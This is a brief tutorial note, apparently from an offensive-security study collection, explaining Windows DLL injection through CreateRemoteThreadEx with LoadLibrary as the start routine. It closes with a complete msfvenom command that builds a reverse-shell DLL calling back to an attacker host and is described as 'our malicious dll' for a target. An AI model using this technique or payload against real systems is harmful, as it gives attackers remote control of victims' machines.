# DLL Injection
The code is largely the same as the shell injection, we open a process, write our injection and create a thread.
The key difference is that we use a malicious DLL file instead of a shellcode.

In order to load our DLL we need to use the [LoadLibrary](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryw) function. It will allow us to open the dll and retrieve the [DLLmain](https://learn.microsoft.com/en-us/windows/win32/dlls/dllmain) of our DLL where our malicious code is

To do this we will need the [GetProcAddress](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress) function with the handle for Kernel32.dll.
We get that handle with [GetModuleHandle](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlew)

Another important difference is that we also need a type LPTHREAD_START_ROUTINE that will serve as the start address for the [CreateRemoteThreadEx](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethreadex)
In the case of the Process Injection via shellcode we used the remote buffer that we wrote the shellcode into. 
Here on the other hand, we use the GetProcAddress as our starting address and the remote buffer that we get for our malicious dll as the parameter.

We craft our malicious dll in msfvenom and move it to our target
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_IP> LPORT=<listen_port> -f dll -o inject.dll
```
